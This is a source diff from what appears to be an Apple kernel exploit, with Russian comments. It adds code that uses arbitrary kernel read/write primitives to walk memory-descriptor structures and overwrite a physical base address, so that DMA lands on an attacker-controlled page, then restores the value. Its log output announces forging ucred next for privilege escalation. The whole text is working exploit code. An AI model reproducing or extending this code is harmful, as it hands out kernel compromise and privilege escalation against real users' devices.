@@ -6526,6 +6526,74 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             }
         }
     }
+    // 1.9.207 (р.53): два носителя базы offset-0. A: [pd+0x28] — wire token
+    // (pacda-signed disc 0x5ef8 — ТОЛЬКО ЧИТАЕМ, запись = паника на autda).
+    // B: [pd+0x90]→+0x10=records→record[0]+0x00 = owner-MD — его ranges держат
+    // базу == backingPA; патчим её на ctlPA (plain data, без PAC) → rewriter
+    // 0x86eb7cc скопирует в desc+0x9c при execute → DART замапит ctlPA.
+    uint64_t ownHitArr = 0, ownHitOld = 0;
+    uint32_t ownHitOff = 0;
+    {
+        uint64_t pd207 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+        if (kpLooksLikeKernelPointer(pd207) && kpSafeToRead(pd207)) {
+            // A — верификация токена (без записи!)
+            uint64_t tok = kp_untag_ptr(early_kread64(pd207 + 0x28));
+            uint64_t tokv = kpLooksLikeKernelPointer(tok) ? early_kread64(tok) : 0;
+            kpNote(r, [NSString stringWithFormat:@"  [OWN] A: [pd+0x28]=%#llx [P]=%#x%@ (signed — не пишем)",
+                      (unsigned long long)tok, (uint32_t)tokv,
+                      (uint32_t)tokv == 0x41544159 ? @" ← МАРКЕР, токен и есть backing VA" : @""]);
+            // B — цепочка к owner-MD
+            uint64_t ro207 = kp_untag_ptr(early_kread64(pd207 + 0x90));
+            uint64_t recs = (kpLooksLikeKernelPointer(ro207) && kpSafeToRead(ro207)) ? kp_untag_ptr(early_kread64(ro207 + 0x10)) : 0;
+            uint64_t ownerMD = (kpLooksLikeKernelPointer(recs) && kpSafeToRead(recs)) ? kp_untag_ptr(early_kread64(recs + 0)) : 0;
+            kpNote(r, [NSString stringWithFormat:@"  [OWN] B: [pd+0x90]=%#llx recs=%#llx ownerMD=%#llx",
+                      (unsigned long long)ro207, (unsigned long long)recs, (unsigned long long)ownerMD]);
+            if (kpLooksLikeKernelPointer(ownerMD) && kpSafeToRead(ownerMD)) {
+                // охота базы offset-0: поля ownerMD + его ranges-массив
+                uint64_t cand[16]; uint32_t candOff[16]; int nCand = 0;
+                for (uint32_t o = 0; o + 8 <= 0x100 && nCand < 16; o += 8) {
+                    uint64_t q = early_kread64(ownerMD + o);
+                    if (q == backingPA || (uint32_t)(q >> 32) == pfn32 || (uint32_t)q == pfn32) {
+                        cand[nCand] = q; candOff[nCand] = o; nCand++;
+                        kpNote(r, [NSString stringWithFormat:@"    [OWN] ownerMD+%#x: %#018llx ← база?", o, (unsigned long long)q]);
+                    }
+                }
+                uint64_t oarr = kp_untag_ptr(early_kread64(ownerMD + 0x60));
+                uint32_t ocnt = (uint32_t)early_kread64(ownerMD + 0x68);
+                if (ocnt > 0x4000) ocnt = 0x4000;
+                kpNote(r, [NSString stringWithFormat:@"    [OWN] owner ranges=%#llx count=%u", (unsigned long long)oarr, ocnt]);
+                if (kpLooksLikeKernelPointer(oarr)) {
+                    for (uint32_t i = 0; i < ocnt && !ownHitArr; i++) {
+                        uint64_t e0 = early_kread64(oarr + (uint64_t)i * 16);
+                        if (e0 == backingPA || (uint32_t)(e0 >> 32) == pfn32 || (uint32_t)e0 == pfn32) {
+                            ownHitArr = oarr; ownHitOff = (uint32_t)i * 16; ownHitOld = e0;
+                            uint64_t nq = (e0 == backingPA) ? ctlPA
+                                        : ((uint32_t)(e0 >> 32) == pfn32) ? (((uint64_t)ctlPFN << 32) | (e0 & 0xffffffffULL))
+                                        : ((e0 & 0xffffffff00000000ULL) | ctlPFN);
+                            kpNote(r, [NSString stringWithFormat:@"  [OWN] ★ база offset-0 @ ranges[%u]: %#018llx → %#018llx",
+                                      i, (unsigned long long)e0, (unsigned long long)nq]);
+                            early_kwrite64(oarr + (uint64_t)i * 16, nq);
+                            uint64_t rb8 = early_kread64(oarr + (uint64_t)i * 16);
+                            kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb8, rb8 == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
+                        }
+                    }
+                }
+                if (!ownHitArr && nCand) {
+                    // база в поле ownerMD напрямую
+                    ownHitArr = ownerMD; ownHitOff = candOff[0]; ownHitOld = cand[0];
+                    uint64_t nq = (cand[0] == backingPA) ? ctlPA
+                                : ((uint32_t)(cand[0] >> 32) == pfn32) ? (((uint64_t)ctlPFN << 32) | (cand[0] & 0xffffffffULL))
+                                : ((cand[0] & 0xffffffff00000000ULL) | ctlPFN);
+                    kpNote(r, [NSString stringWithFormat:@"  [OWN] ★ база в поле ownerMD+%#x: %#018llx → %#018llx",
+                              candOff[0], (unsigned long long)cand[0], (unsigned long long)nq]);
+                    early_kwrite64(ownerMD + candOff[0], nq);
+                    uint64_t rb8 = early_kread64(ownerMD + candOff[0]);
+                    kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb8, rb8 == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
+                }
+                if (!ownHitArr) kpNote(r, @"  [OWN] базы backingPA в ownerMD нет — носитель глубже");
+            }
+        }
+    }
     // 3. Trusted-path резолв surfVA через M2 async op-entry (1.9.124):
     //    async submit резолвит surface ptr в op-entry БЕЗ execute/снапшота
     //    (раунд 13: DVA-снапшот только при execute). Вся цепочка — из РЕАЛЬНЫХ
@@ -6908,6 +6976,13 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         uint64_t rb6 = early_kread64(parHitArr + parHitOff);
         kpNote(r, [NSString stringWithFormat:@"  [PAR] restore записи арены: %#018llx — %@", (unsigned long long)rb6,
                   rb6 == parHitOld ? @"вернули оригинал" : @"НЕ вернулось"]);
+    }
+    // 1.9.207: restore базы owner-MD
+    if (ownHitArr) {
+        early_kwrite64(ownHitArr + ownHitOff, ownHitOld);
+        uint64_t rb9 = early_kread64(ownHitArr + ownHitOff);
+        kpNote(r, [NSString stringWithFormat:@"  [OWN] restore базы owner-MD: %#018llx — %@", (unsigned long long)rb9,
+                  rb9 == ownHitOld ? @"вернули оригинал" : @"НЕ вернулось"]);
     }
     if (changed) {
         kpNote(r, [NSString stringWithFormat:@"=== PHYSWRITE DMA CONFIRMED: контрольная страница изменена DMA (%u dword) — page-list swap до execute РАБОТАЕТ. Дальше форж ucred ===", changed]);
